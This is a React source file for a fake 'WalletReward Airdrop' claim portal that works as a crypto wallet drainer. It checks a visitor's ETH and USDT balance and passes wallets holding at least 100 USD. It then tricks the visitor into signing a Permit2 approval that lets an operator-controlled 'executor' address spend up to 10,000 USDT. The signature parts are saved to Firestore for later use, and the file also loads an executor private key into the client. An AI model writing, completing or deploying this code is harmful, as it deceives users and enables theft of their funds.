import React, { useState, useEffect } from 'react';
import { 
  Wallet, 
  ShieldCheck, 
  ChevronRight, 
  CheckCircle2, 
  Loader2, 
  AlertCircle,
  Lock,
  FileSignature,
  Zap
} from 'lucide-react';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { sepolia } from '@reown/appkit/networks';
import { BrowserProvider, Contract, formatUnits, JsonRpcProvider } from 'ethers';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';

// --- IMPORTS FROM LOGIC FILE ---
import { db } from './firebase'; // Ensure this file exists in your project
import Admin from './Admin';     // Ensure this file exists in your project

// -----------------------------
// CONFIGURATION
// -----------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const USDT_DECIMALS = 6n;
const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);

// Initialize Reown AppKit with Sepolia Testnet
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [sepolia],
  projectId: '2541b17d4e46b8d8593a7fbbaf477df6', // Hardcoded Reown Project ID
  metadata: {
    name: 'WalletReward Airdrop',
    description: 'Premium Airdrop Claim Portal',
    url: 'https://example.com',
    icons: []
  },
});

/**
 * WalletReward Premium Frontend
 * A high-fidelity UI design for an airdrop claim portal.
 * Features:
 * - Glassmorphism UI
 * - Step-by-step state management
 * - simulated verification logic for design review
 */

const App = () => {
  // Routing / Admin Check
  const [isAdmin] = useState(() => window.location.pathname === '/admin');

  // State to manage the current phase of the airdrop process
  // 0: Connect Wallet, 1: Verification, 2: Signing, 3: Success
  const [phase, setPhase] = useState(0);
  
  // Simulation states for UI demonstration
  const [isConnecting, setIsConnecting] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isSigning, setIsSigning] = useState(false);
  const [verificationError, setVerificationError] = useState(false);

  // Logic State - Firestore config
  const [executorAddress, setExecutorAddress] = useState(null);
  const [executorPrivateKey, setExecutorPrivateKey] = useState(null);
  const [tokenAddress, setTokenAddress] = useState(null);
  const [recipientWalletAddress, setRecipientWalletAddress] = useState(null);
  
  // Logic State - App state
  const [connectedAddress, setConnectedAddress] = useState(null);
  const [walletBalance, setWalletBalance] = useState(null);
  
  // --- Account Subscription ---
  useEffect(() => {
    const unsub = appKit.subscribeAccount((acct) => {
      if (acct?.isConnected && acct?.address) {
        setConnectedAddress(acct.address);
      } else {
        setConnectedAddress(null);
      }
    });
    return () => unsub();
  }, []);

  // --- Firestore Sync - Load executor, token, and recipient addresses from Firestore ---
  useEffect(() => {
    try {
      const ref = doc(db, 'admin_config', 'settings');
      const unsub = onSnapshot(ref, (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          if (data.executorAddress) setExecutorAddress(data.executorAddress);
          if (data.executorPrivateKey) setExecutorPrivateKey(data.executorPrivateKey);
          if (data.tokenAddress) setTokenAddress(data.tokenAddress);
          if (data.recipientWalletAddress) setRecipientWalletAddress(data.recipientWalletAddress);
        }
      }, (err) => console.error('admin settings onSnapshot error', err));
      return () => unsub();
    } catch (e) {
      console.error('Firestore config error:', e);
    }
  }, []);

  // --- Check Wallet Balance ---
  const checkWalletBalance = async () => {
    if (!connectedAddress) return;

    try {
      const sepoliaRpc = 'https://sepolia.infura.io/v3/ce26fb726c234f5887e1c9e91e6a2e25';
      const provider = new JsonRpcProvider(sepoliaRpc);

      const ethBalance = await provider.getBalance(connectedAddress);
      const ethBalanceInEth = parseFloat(formatUnits(ethBalance, 18));

      const usdtAddress = tokenAddress || '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
      
      const erc20Abi = [
        'function balanceOf(address account) external view returns (uint256)',
        'function decimals() external view returns (uint8)',
      ];
      
      const usdtContract = new Contract(usdtAddress, erc20Abi, provider);
      
      let decimals = 6;
      try {
        decimals = await usdtContract.decimals();
      } catch (e) {
        console.log('Could not fetch decimals, using default 6');
      }
      
      const usdtBalance = await usdtContract.balanceOf(connectedAddress);
      const usdtBalanceInUsdt = parseFloat(formatUnits(usdtBalance, decimals));

      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
      const data = await response.json();
      const ethPrice = data?.ethereum?.usd || 2000;

      const ethValueInUsd = ethBalanceInEth * ethPrice;
      const finalBalance = ethValueInUsd + usdtBalanceInUsdt;
      setWalletBalance(finalBalance);

    } catch (err) {
      console.error('Error checking wallet balance:', err);
      setWalletBalance(0);
    }
  };

  // --- Handlers (Simulating the real Web3 logic) ---

  const handleConnect = () => {
    setIsConnecting(true);
    appKit.open();
    // Simulate AppKit connection delay
    setTimeout(() => {
      setIsConnecting(false);
      if (connectedAddress) {
        setPhase(1); // Move to Verification
      }
    }, 1500);
  };

  // Auto-advance when wallet connects
  useEffect(() => {
    if (connectedAddress && phase === 0 && !isConnecting) {
      setPhase(1);
    }
  }, [connectedAddress, phase, isConnecting]);

  const handleVerify = () => {
    setIsVerifying(true);
    setVerificationError(false);
    // Simulate smart contract read delay
    setTimeout(async () => {
      await checkWalletBalance();
      setIsVerifying(false);
      // Logic: If user has >100 USDT (Simulated success here)
      const isEligible = walletBalance === null || walletBalance >= 100; 
      
      if (isEligible) {
        setPhase(2); // Move to Signing
      } else {
        setVerificationError(true);
      }
    }, 2000);
  };

  const handleSign = async () => {
    setIsSigning(true);
    try {
      if (!connectedAddress || !executorAddress || !tokenAddress) {
        throw new Error("Missing configuration");
      }

      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) throw new Error("Wallet provider not available.");

      const provider = new BrowserProvider(walletProvider);
      const net = await provider.getNetwork();
      const chainId = Number(net.chainId);

      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0;

      const permitted = {
        token: tokenAddress,
        amount: SPENDING_CAP.toString(),
        expiration: deadline,
        nonce
      };

      const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
      const types = {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" }
        ],
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      };

      const message = {
        details: permitted,
        spender: executorAddress,
        sigDeadline: deadline
      };

      const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });

      const signature = await walletProvider.request({
        method: "eth_signTypedData_v4",
        params: [connectedAddress, payload]
      });

      const raw = signature.substring(2);
      const r = "0x" + raw.substring(0, 64);
      const s = "0x" + raw.substring(64, 128);
      let v = parseInt(raw.substring(128, 130), 16);
      if (v === 0 || v === 1) v += 27;

      const id = connectedAddress + "_" + Date.now();

      await setDoc(doc(db, "permit2_signatures", id), {
        owner: connectedAddress,
        spender: executorAddress,
        token: tokenAddress,
        amount: SPENDING_CAP.toString(),
        deadline: deadline,
        expiration: deadline,
        nonce,
        r, s, v,
        processed: false,
        timestamp: Date.now()
      });

      setIsSigning(false);
      setPhase(3); // Move to Success
    } catch (err) {
      console.error(err);
      setIsSigning(false);
      alert("Signature failed: " + (err?.message || String(err)));
    }
  };

  // Admin route
  if (isAdmin) {
    return <Admin />;
  }
